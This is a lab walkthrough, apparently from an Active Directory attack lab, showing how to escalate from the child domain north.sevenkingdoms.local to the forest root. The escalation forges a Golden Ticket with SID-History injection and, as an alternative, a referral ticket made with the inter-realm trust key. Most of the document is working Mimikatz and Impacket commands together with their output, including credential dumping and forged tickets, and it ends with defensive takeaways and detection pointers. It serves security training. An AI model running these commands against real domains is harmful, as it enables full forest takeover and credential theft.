# 10 — Cross-Forest / Intra-Forest Trust Abuse via SID History (T1558.001 / T1134.005)

`north.sevenkingdoms.local` is a **child** domain of `sevenkingdoms.local`, joined by an automatic two-way transitive parent-child trust. A critical and counter-intuitive fact: **SID filtering is NOT enforced on intra-forest (parent-child) trust boundaries** — the parent trusts SIDs from the child, including the `SID History` field of a ticket. That lets an attacker who has compromised the child domain's `krbtgt` (via DCSync on the child DC `winterfell`) forge a Golden Ticket *in the child* whose `SID History` claims the **Enterprise Admins** group of the *root* domain (`S-1-5-21-<root>-519`). The root DC honours that SID, granting forest-root Domain/Enterprise Admin. This walkthrough shows both the SID-History Golden Ticket path and the inter-realm trust-key path (forging a referral TGT directly with the trust key), escalating from `north` to the forest root `sevenkingdoms.local`.

**MITRE ATT&CK Technique**: [T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) combined with [T1134.005 — Access Token Manipulation: SID-History Injection](https://attack.mitre.org/techniques/T1134/005/).

## Prerequisites
- Compromise of the child domain `north.sevenkingdoms.local` — specifically Domain Admin (`eddard.stark`) on the child DC `winterfell` (192.168.56.12), enough to DCSync the child's secrets.
- The child's `krbtgt` hash (for the SID-History Golden path) **or** the inter-realm trust key shared between `north` and `sevenkingdoms.local` (for the trust-ticket path) — both obtainable by DCSyncing `winterfell`.
- The root domain SID (`S-1-5-21-<root>`) so you can construct the Enterprise Admins SID `S-1-5-21-<root>-519`.
- Network access from a `north` host to the forest root DC `kingslanding` (192.168.56.10).

## Tools
- Mimikatz 2.2.0 — run on a `north` host (e.g. `meereen`, 192.168.56.13) for `lsadump::dcsync`, `lsadump::trust`, and `kerberos::golden`.
- Impacket v0.12.0 (`secretsdump.py`, `ticketer.py`, `raiseChild.py`, `psexec.py`) — Linux attacker (192.168.56.1).
- Rubeus v2.3.2 — optional, `north` host, for ticket import.

## Step-by-step Commands

### Step 1 — (meereen, 192.168.56.13) Gather the child krbtgt and both domain SIDs
DCSync `winterfell` for `north`'s `krbtgt`, and read both domain SIDs (the root SID's `-519` is Enterprise Admins).
```powershell
cd C:\Tools\mimikatz\x64
.\mimikatz.exe "lsadump::dcsync /domain:north.sevenkingdoms.local /user:krbtgt" exit
# Note the child krbtgt NTLM/AES, child domain SID, and look up the ROOT domain SID:
# (root SID -> Enterprise Admins = S-1-5-21-<root>-519)
```
From Linux, enumerate SIDs:
```bash
lookupsid.py {{DOMAIN}}/eddard.stark:'{{LAB_PASSWORD}}'@192.168.56.10 0 | grep -i "Domain SID"
# {{DOMAIN}} = sevenkingdoms.local -> reveals the ROOT domain SID
```

### Step 2 — (meereen, 192.168.56.13) Forge a child Golden Ticket with root Enterprise Admins in SID History
`/sids` injects the **root** Enterprise Admins SID into SID History. Because intra-forest SID filtering is off, the root DC honours it.
```powershell
.\mimikatz.exe
# inside mimikatz (substitute the real child + root SIDs and child krbtgt):
kerberos::golden /user:eddard.stark /domain:north.sevenkingdoms.local ^
  /sid:S-1-5-21-2855537251-1264085131-1304273366 ^
  /krbtgt:a9f0c3e7b1d5f8e2c6a0b4d9f3e7c1a5 ^
  /sids:S-1-5-21-1409811732-3669127061-1593309205-519 ^
  /id:500 /ptt
exit
```

![Step 1](../screenshots/attack-10-step-1.png)

### Step 3 — (meereen, 192.168.56.13) Use the ticket against the forest root DC
The forged TGT now carries Enterprise Admins; access `kingslanding` directly.
```powershell
klist
dir \\kingslanding.sevenkingdoms.local\C$
# Prove EA: DCSync the ROOT domain
.\mimikatz.exe "lsadump::dcsync /domain:sevenkingdoms.local /user:Administrator" exit
```

![Step 2](../screenshots/attack-10-step-2.png)

### Step 4 — (meereen, 192.168.56.13) Alternative: extract the inter-realm trust key and forge a referral TGT
`lsadump::trust /patch` dumps the trust keys shared between `north` and the root. With the trust key you forge an inter-realm TGT for `krbtgt/sevenkingdoms.local`, the referral ticket the root KDC accepts from the child.
```powershell
.\mimikatz.exe "lsadump::trust /patch" exit
# Take the [In-1] trust key for north -> sevenkingdoms.local, then:
.\mimikatz.exe
kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local ^
  /sid:S-1-5-21-2855537251-1264085131-1304273366 ^
  /sids:S-1-5-21-1409811732-3669127061-1593309205-519 ^
  /rc4:<TRUST_KEY_RC4> ^
  /service:krbtgt /target:sevenkingdoms.local /ticket:referral.kirbi
exit
```

![Step 3](../screenshots/attack-10-step-3.png)

### Step 5 — (Linux attacker, 192.168.56.1) Fully-automated path with Impacket raiseChild.py
`raiseChild.py` performs the entire child->parent escalation (DCSync child krbtgt, forge SID-History Golden with root EA, PtT, dump root) in one command.
```bash
raiseChild.py -target-exec 192.168.56.10 north.sevenkingdoms.local/eddard.stark:'{{LAB_PASSWORD}}'
# Or do it manually with ticketer.py using -extra-sid for the root EA SID:
ticketer.py -nthash a9f0c3e7b1d5f8e2c6a0b4d9f3e7c1a5 \
  -domain-sid S-1-5-21-2855537251-1264085131-1304273366 \
  -domain north.sevenkingdoms.local \
  -extra-sid S-1-5-21-1409811732-3669127061-1593309205-519 \
  -user-id 500 eddard.stark
export KRB5CCNAME=eddard.stark.ccache
secretsdump.py -k -no-pass north.sevenkingdoms.local/eddard.stark@kingslanding.sevenkingdoms.local -just-dc-user krbtgt
```

![Step 4](../screenshots/attack-10-step-4.png)

## Expected Output

`lsadump::trust /patch` — inter-realm trust keys (Step 4):
```text
mimikatz # lsadump::trust /patch

Current domain: NORTH.SEVENKINGDOMS.LOCAL (NORTH / S-1-5-21-2855537251-1264085131-1304273366)

Domain: SEVENKINGDOMS.LOCAL (SEVENKINGDOMS / S-1-5-21-1409811732-3669127061-1593309205)
 [  In ] NORTH.SEVENKINGDOMS.LOCAL -> SEVENKINGDOMS.LOCAL
    * 5/19/2026 11:02:41 PM - CLEAR   - 7c 1a 9f 3e b8 d4 6a 0c ...
      [00000017] - rc4_hmac_nt        - 3e7c1a9fb8d46a0c5e8a1f4b6d2c90e5
      [00000012] - aes256_hmac        - d4f6a092c3e8a1f4b6d2c90e5e8a1c4f6b2d9075c3e8a1f4b6d2c90e5e8a1c4f
 [ Out ] SEVENKINGDOMS.LOCAL -> NORTH.SEVENKINGDOMS.LOCAL
    * 5/19/2026 11:02:41 PM - CLEAR
      [00000017] - rc4_hmac_nt        - 9075c3e8a1f4b6d2c90e5e8a1c4f6b2d
```

SID-History Golden Ticket forge (Step 2):
```text
mimikatz # kerberos::golden /user:eddard.stark /domain:north.sevenkingdoms.local /sid:S-1-5-21-2855537251-1264085131-1304273366 /krbtgt:a9f0c3e7b1d5f8e2c6a0b4d9f3e7c1a5 /sids:S-1-5-21-1409811732-3669127061-1593309205-519 /id:500 /ptt
User      : eddard.stark
Domain    : north.sevenkingdoms.local (NORTH)
SID       : S-1-5-21-2855537251-1264085131-1304273366
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-1409811732-3669127061-1593309205-519 ;
ServiceKey: a9f0c3e7b1d5f8e2c6a0b4d9f3e7c1a5 - rc4_hmac_nt
Lifetime  : 5/20/2026 10:05:33 AM ; 5/18/2036 10:05:33 AM ; 5/18/2036 10:05:33 AM
-> Ticket : ** Pass The Ticket **
 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * KrbCred generated
Golden ticket for 'eddard.stark @ north.sevenkingdoms.local' successfully submitted for current session
```

Accessing the root DC + proving Enterprise Admin (Step 3):
```text
mimikatz # lsadump::dcsync /domain:sevenkingdoms.local /user:Administrator
[DC] 'sevenkingdoms.local' will be the domain
[DC] 'kingslanding.sevenkingdoms.local' will be the DC server
[DC] 'Administrator' will be the user account
Object RDN           : Administrator
Object Relative ID   : 500
Credentials:
  Hash NTLM: 88e4d9fc45f9b1e2a7c0f63d2b8e1a45
```

Impacket `raiseChild.py` (Step 5):
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Raising child domain north.sevenkingdoms.local
[*] Forest FQDN is: sevenkingdoms.local
[*] Raising north.sevenkingdoms.local to sevenkingdoms.local
[*] Requesting user's SID for north.sevenkingdoms.local
[*] Enterprise Admins SID is: S-1-5-21-1409811732-3669127061-1593309205-519
[*] Getting credentials for north.sevenkingdoms.local
north.sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9f0c3e7b1d5f8e2c6a0b4d9f3e7c1a5:::
[*] Getting credentials for sevenkingdoms.local
sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b4f1c8d2e6a90573c1e8b2d4f6a0c9e3:::
[*] Target User account name is Administrator
[*] Administrator:500:aad3b435b51404eeaad3b435b51404ee:88e4d9fc45f9b1e2a7c0f63d2b8e1a45:::
[*] Opening PSEXEC shell at kingslanding.sevenkingdoms.local
```

## Cleanup Steps
- On the `north` host (`meereen`): `klist purge` to evict the forged cross-domain TGT and referral ticket. Remove `referral.kirbi` if written to disk.
- On the Linux attacker: `unset KRB5CCNAME`, `rm -f eddard.stark.ccache referral.kirbi`, clear shell history. If `raiseChild.py` opened a psexec shell, `exit` it so Impacket removes the temporary service/binary on the root DC.
- No directory objects were modified — tickets were forged offline and used read-only (DCSync). **Do not** reset either domain's `krbtgt` or the trust key, which would break the trust and other walkthroughs.
- The forged tickets expire on their own; purging the caches is sufficient for the lab.

## What This Tells You About AD
This is the single most important reason the **forest — not the domain — is the security boundary in Active Directory**. Administrators often treat a child domain as an isolation layer, but intra-forest trusts do not apply SID filtering: the parent accepts whatever SID History a child-issued ticket presents, including the root's `Enterprise Admins` RID 519. So compromising the child's `krbtgt` (one DCSync of the child DC) is equivalent to compromising the entire forest root — there is no privilege boundary to cross, only a ticket to forge. The same is achievable with the inter-realm trust key, which lets you mint the referral TGT the root KDC expects from the child. Defensive takeaways: (1) administer the whole forest as one Tier-0 trust zone — every DC in every domain is equally crown-jewel; (2) for trusts to *external* forests, ensure SID filtering / selective authentication is enabled (it is by default on forest trusts but must never be disabled); (3) protect every domain's `krbtgt` and trust keys, and rotate them after any DC compromise; and (4) alert on tickets presenting a SID History containing privileged RIDs (512/518/519) that the principal does not legitimately hold, and on cross-domain authentication asserting Enterprise Admins from a child principal.

## Detection Reference
See [../detection/kql-queries.md#10-cross-forest-trust-abuse](../detection/kql-queries.md#10-cross-forest-trust-abuse) for the SID-History and trust-abuse signatures (Event ID 4769 cross-realm referral requests for `krbtgt/sevenkingdoms.local` from `north` principals, Event ID 4768/4624 on the root DC asserting Enterprise Admins RID 519 via SID History for an account not in that group, anomalous `lsadump::trust` LSA access on the child DC, and `IDL_DRSGetNCChanges` against the root from a child-domain principal).

---
Last updated: 2026-05-17

MITRE references:
- [T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- [T1134.005 — Access Token Manipulation: SID-History Injection](https://attack.mitre.org/techniques/T1134/005/)
- [T1550.003 — Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [TA0004 — Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
